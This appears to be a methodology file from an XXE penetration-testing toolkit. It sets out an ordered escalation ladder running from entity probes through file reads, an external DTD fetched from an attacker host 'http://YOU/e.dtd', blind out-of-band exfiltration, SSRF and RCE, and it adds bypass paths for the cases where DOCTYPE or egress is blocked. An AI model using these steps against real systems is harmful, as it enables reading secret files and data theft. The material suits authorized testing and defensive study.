# Workflow — the ordered escalation ladder

## Rungs in order — cheapest signal first

0. **Baseline** — send a clean `<?xml?><r>x</r>` request — record
   status + body-length. Everything diffs against this.
1. **Internal-entity echo** — `entity-basics.md` — `&probe;`→`XXE_PROBE`
   — proves the parser expands entities at all
2. **Known-file external entity** — `file-read.md` —
   `file:///etc/passwd` — proves EXTERNAL entities resolve in-band
3. **External DTD fetch** — `external-dtd.md` — your `<!ENTITY % d
   SYSTEM "http://YOU/e.dtd">` — proves param-entities + outbound fetch
   — the OOB listener hits
4. **Blind exfil** — `blind-xxe.md` — wrap file-read in param-entity
   URL — the OOB query/path carries the content
5. **Error-channel** — `error-based.md` — feed a nonexistent path, read
   the exception — in-band exfil via error
6. **Local-DTD hijack** — `local-dtd-hijack.md` — no egress needed —
   reuse a DTD already on the box
7. **XInclude** — `xinclude.md` — when DOCTYPE is refused entirely
8. **SSRF inside XXE** — `ssrf-via-xxe.md` — entity = internal URL
9. **Upload-surface** — `svg-xxe.md`/`ooxml.md`/`content-type-confusion`
   — when the XML arrives inside a file
10. **RCE paths** — `xxe-to-rce.md` — only after read is proven

## The mechanism-layer switch — per `decide.py`

When a rung exhausts 5 probes/15 min, change LAYER not payload:

- entity expand? → external-entity → DTD-fetch → OOB-exfil → XInclude
- in-band fails → blind → error-channel → local-DTD
- body-XML fails → upload-container (SVG/DOCX) → content-type-confusion

## Per-surface decisions

- parser fingerprint? → `parser-specifics.md`
- a file with `<`/`&` inside won't read? → `cdata-wrapping.md` or
  `php://filter` base64
- DOCTYPE blocked? → XInclude → container-upload → encoding trick
- egress blocked? → local-DTD → DNS-only OOB → in-band error channel
- upload surface? → SVG → OOXML → misc-formats

## Recording — the ledger shape

- `post-probe` per rung: `python3 tools/hooks.py <name> post-probe
  --hypothesis-id <h> --verdict <v> --evidence-kind class
  --evidence "<excerpt>" --response "<full response>"`
- the OOB hit is evidence only if it carries the expected marker —
  `oob_listener.py hits --log` output

## The two-axis falsifier

- **Expansion off:** internal `&probe;` doesn't echo → entities dead →
  try XInclude → if XInclude dead too → class dead on this surface
- **Egress off:** external-DTD never hits your listener BUT internal
  entity expanded → in-band still possible via file-read echo or
  error-channel — blind-OOB specifically dead, not the class
